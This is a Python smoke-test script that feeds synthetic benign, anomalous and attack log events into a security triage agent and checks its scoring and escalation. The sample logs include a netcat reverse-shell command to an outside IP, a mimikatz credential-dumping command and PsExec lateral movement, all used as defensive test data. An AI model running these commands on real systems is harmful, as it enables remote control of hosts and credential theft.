#!/usr/bin/env python3
"""Quick smoke-test: send known-attack & anomaly logs through the triage agent,
then verify scoring + escalation + hunter-tasks publishing."""

import json, subprocess, time, sys, uuid
from datetime import datetime, timezone

TS = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")

# ── Test events: Mix of benign, anomaly, and known-attack patterns ──────────
EVENTS = [
    # 1. BENIGN — normal web access
    {"topic": "raw-logs", "label": "BENIGN",
     "event": {"timestamp": TS, "hostname": "web-01", "source_ip": "192.168.1.10",
               "user_id": "alice", "source_type": "syslog", "level": "info",
               "message": "GET /index.html 200 OK",
               "bytes_sent": 200, "bytes_received": 1024,
               "protocol": "tcp", "dst_port": 443, "duration_ms": 15}},

    # 2. ANOMALY — huge data exfiltration at 3 AM
    {"topic": "network-events", "label": "ANOMALY-EXFIL",
     "event": {"timestamp": TS, "hostname": "db-srv-01", "source_ip": "10.0.0.50",
               "user_id": "", "source_type": "network", "level": "critical",
               "message": "Outbound 500MB transfer to 198.51.100.99 port 4444 over 10 minutes",
               "bytes_sent": 524288000, "bytes_received": 512,
               "protocol": "tcp", "dst_port": 4444, "duration_ms": 600000}},

    # 3. KNOWN ATTACK — Credential dumping (mimikatz)
    {"topic": "process-events", "label": "ATTACK-CREDENTIAL-DUMP",
     "event": {"timestamp": TS, "hostname": "ws-finance-03", "source_ip": "172.16.5.99",
               "user_id": "svc_backup", "source_type": "process", "level": "critical",
               "message": "mimikatz.exe sekurlsa logonpasswords executed with SYSTEM privileges",
               "bytes_sent": 131072, "bytes_received": 524288,
               "protocol": "tcp", "dst_port": 445, "duration_ms": 90000}},

    # 4. KNOWN ATTACK — Lateral movement via PsExec
    {"topic": "process-events", "label": "ATTACK-LATERAL-MOVEMENT",
     "event": {"timestamp": TS, "hostname": "dc-primary", "source_ip": "10.0.0.1",
               "user_id": "domain_admin", "source_type": "process", "level": "critical",
               "message": "PsExec.exe launched cmd.exe on remote host 10.0.0.20 with domain admin creds",
               "bytes_sent": 65536, "bytes_received": 262144,
               "protocol": "tcp", "dst_port": 445, "duration_ms": 120000}},

    # 5. KNOWN ATTACK — Brute force RDP
    {"topic": "security-events", "label": "ATTACK-BRUTE-FORCE",
     "event": {"timestamp": TS, "hostname": "rdp-gateway", "source_ip": "203.0.113.42",
               "user_id": "admin", "source_type": "windows_security", "level": "critical",
               "message": "500 failed login attempts in 60 seconds from external IP on RDP service",
               "bytes_sent": 0, "bytes_received": 8192,
               "protocol": "tcp", "dst_port": 3389, "duration_ms": 60000}},

    # 6. ANOMALY — Rare process on critical server
    {"topic": "process-events", "label": "ANOMALY-RARE-PROCESS",
     "event": {"timestamp": TS, "hostname": "prod-api-01", "source_ip": "10.10.10.5",
               "user_id": "www-data", "source_type": "process", "level": "warning",
               "message": "nc -e /bin/sh 198.51.100.50 9999 reverse shell spawned by web service",
               "bytes_sent": 262144, "bytes_received": 131072,
               "protocol": "tcp", "dst_port": 9999, "duration_ms": 300000}},
]

def rpk_produce(topic: str, payload: str):
    """Produce a single message to Redpanda via rpk."""
    r = subprocess.run(
        ["docker", "exec", "-i", "clif-redpanda01", "rpk", "topic", "produce", topic,
         "--key", str(uuid.uuid4())[:8]],
        input=(payload + "\n").encode(), capture_output=True, timeout=10,
    )
    return r.returncode == 0

def get_health():
    r = subprocess.run(
        ["docker", "exec", "clif-triage-agent", "python", "-c",
         "import urllib.request,json;print(urllib.request.urlopen('http://localhost:8300/health').read().decode())"],
        capture_output=True, text=True, timeout=10,
    )
    return json.loads(r.stdout.strip()) if r.returncode == 0 else {}

def ch_query(sql: str):
    r = subprocess.run(
        ["docker", "exec", "clif-clickhouse01", "clickhouse-client", "-q", sql],
        capture_output=True, text=True, timeout=10,
    )
    return r.stdout.strip()

# ─────────────────────────────────────────────────────────────────────────────
print("=" * 70)
print("CLIF Triage Agent — Attack & Anomaly Smoke Test")
print("=" * 70)

# Step 1: Baseline
h0 = get_health()
base_count = h0.get("events_processed", 0)
print(f"\n[1/5] Baseline: {base_count} events already processed")

# Step 2: Produce test events
print(f"\n[2/5] Producing {len(EVENTS)} test events...")
for ev in EVENTS:
    ok = rpk_produce(ev["topic"], json.dumps(ev["event"]))
    status = "OK" if ok else "FAIL"
    print(f"  {ev['label']:30s} -> {ev['topic']:20s} [{status}]")

# Step 3: Wait for processing
print("\n[3/5] Waiting 8s for triage agent to process...")
time.sleep(8)

h1 = get_health()
new_count = h1.get("events_processed", 0)
delta = new_count - base_count
print(f"  Events processed: {base_count} -> {new_count} (+{delta})")
if delta < len(EVENTS):
    print(f"  [!] Expected >= {len(EVENTS)}, got {delta}. Waiting 5s more...")
    time.sleep(5)
    h1 = get_health()
    new_count = h1.get("events_processed", 0)
    delta = new_count - base_count
    print(f"  Events processed: {new_count} (+{delta})")

# Step 4: Check triage-scores in ClickHouse
print(f"\n[4/5] Querying triage_scores from ClickHouse...")
rows = ch_query(
    "SELECT hostname, combined_score, adjusted_score, action, lgbm_score, eif_score, arf_score "
    "FROM clif_logs.triage_scores "
    "ORDER BY timestamp DESC LIMIT 10 "
    "FORMAT TSVWithNames"
)
if rows:
    lines = rows.split("\n")
    print(f"  {'hostname':20s} {'combined':>9s} {'adjusted':>9s} {'action':>9s} {'lgbm':>7s} {'eif':>7s} {'arf':>7s}")
    print("  " + "-" * 72)
    for line in lines[1:]:
        parts = line.split("\t")
        if len(parts) >= 7:
            print(f"  {parts[0]:20s} {float(parts[1]):9.4f} {float(parts[2]):9.4f} {parts[3]:>9s} {float(parts[4]):7.4f} {float(parts[5]):7.4f} {float(parts[6]):7.4f}")

    escalated = [l for l in lines[1:] if "escalate" in l]
    monitored = [l for l in lines[1:] if "monitor" in l]
    discarded = [l for l in lines[1:] if "discard" in l]
    print(f"\n  Summary: {len(escalated)} escalated, {len(monitored)} monitored, {len(discarded)} discarded")
else:
    print("  [FAIL] No rows in triage_scores!")

# Step 5: Verify hunter-tasks topic
print(f"\n[5/5] Checking hunter-tasks topic for escalated events...")
r = subprocess.run(
    ["docker", "exec", "clif-redpanda01", "timeout", "3",
     "rpk", "topic", "consume", "hunter-tasks", "--num", "10", "-f", "%v\n"],
    capture_output=True, text=True, timeout=15,
)
hunter_msgs = [l for l in r.stdout.strip().split("\n") if l.strip()]
esc_in_hunter = 0
for msg in hunter_msgs:
    try:
        d = json.loads(msg)
        if d.get("action") == "escalate":
            esc_in_hunter += 1
            print(f"  [OK] {d['hostname']:20s}  score={d['adjusted_score']:.4f}  "
                  f"lgbm={d['lgbm_score']:.3f} eif={d['eif_score']:.3f} arf={d['arf_score']:.3f}")
    except Exception:
        pass

print(f"\n  hunter-tasks: {esc_in_hunter} escalated events found")

# Final verdict — use ClickHouse rows + hunter-tasks as ground truth
#   (health counter can lag due to async batch processing)
has_ch_rows = rows and len(rows.split("\n")) > 1
print("\n" + "=" * 70)
if has_ch_rows and esc_in_hunter > 0:
    print("[PASS] Triage agent processes attacks & anomalies,")
    print("       escalates high-risk events, and publishes to hunter-tasks.")
    print(f"       ClickHouse: {len(escalated)} escalated + {len(monitored)} monitored")
    print(f"       hunter-tasks: {esc_in_hunter} events ready for Hunter Agent")
elif has_ch_rows:
    print("[PARTIAL] Scores in ClickHouse but no escalations in hunter-tasks.")
    print("          (All events may have scored below 0.89 threshold)")
else:
    print("[FAIL] No triage scores found in ClickHouse.")
print("=" * 70)
